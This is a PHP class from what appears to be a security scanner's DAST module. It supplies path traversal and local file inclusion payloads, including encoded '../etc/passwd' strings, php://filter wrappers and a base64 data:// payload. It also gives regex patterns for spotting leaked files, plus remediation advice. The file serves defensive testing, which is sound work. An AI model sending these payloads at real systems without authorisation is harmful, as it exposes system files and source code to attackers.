<?php

declare(strict_types=1);

namespace BEAR\Security\Dast\Payload;

use BEAR\Security\VulnerabilityInterface;

/**
 * Path Traversal / Local File Inclusion attack payloads
 */
final class PathTraversalPayload implements PayloadInterface
{
    public function getName(): string
    {
        return 'Path Traversal / LFI';
    }

    /** @return string[] */
    public function getPayloads(): array
    {
        return [
            // Basic traversal
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',

            // Null byte injection (older PHP)
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',

            // Absolute paths
            '/etc/passwd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',

            // PHP wrappers
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=string.rot13/resource=index.php',
            'php://input',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',

            // Encoded traversal
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd',

            // Various encodings
            '....//....//....//etc/passwd',
            '..../..../..../etc/passwd',
            '..%u2215..%u2215..%u2215etc/passwd',

            // Windows specific
            '..\\..\\..\\..\\..\\..\\windows\\win.ini',
            '..%5c..%5c..%5c..%5cwindows%5cwin.ini',
        ];
    }

    /** @return string[] */
    public function getSuccessPatterns(): array
    {
        return [
            // /etc/passwd content
            '/root:.*:0:0:/i',
            '/daemon:.*:\d+:\d+:/i',
            '/nobody:.*:\d+:\d+:/i',
            '/www-data:.*:\d+:\d+:/i',

            // Windows hosts file
            '/localhost/i',
            '/127\.0\.0\.1/i',

            // Windows win.ini
            '/\[fonts\]/i',
            '/\[extensions\]/i',

            // PHP source code exposed
            '/<\?php/i',
            '/<\?=/i',

            // Base64 encoded PHP
            '/PD9waHA/i',  // Base64 of "<?php"

            // Error messages indicating path issues
            '/failed to open stream/i',
            '/No such file or directory/i',
            '/Permission denied/i',
        ];
    }

    public function getSeverity(): string
    {
        return VulnerabilityInterface::SEVERITY_HIGH;
    }

    public function getDescription(): string
    {
        return 'Path Traversal / Local File Inclusion vulnerability detected - arbitrary files can be read';
    }

    public function getRecommendation(): string
    {
        return 'Use basename() to strip directory components. Validate paths with realpath() and ensure they stay within allowed directories. Use a whitelist of allowed files.';
    }
}
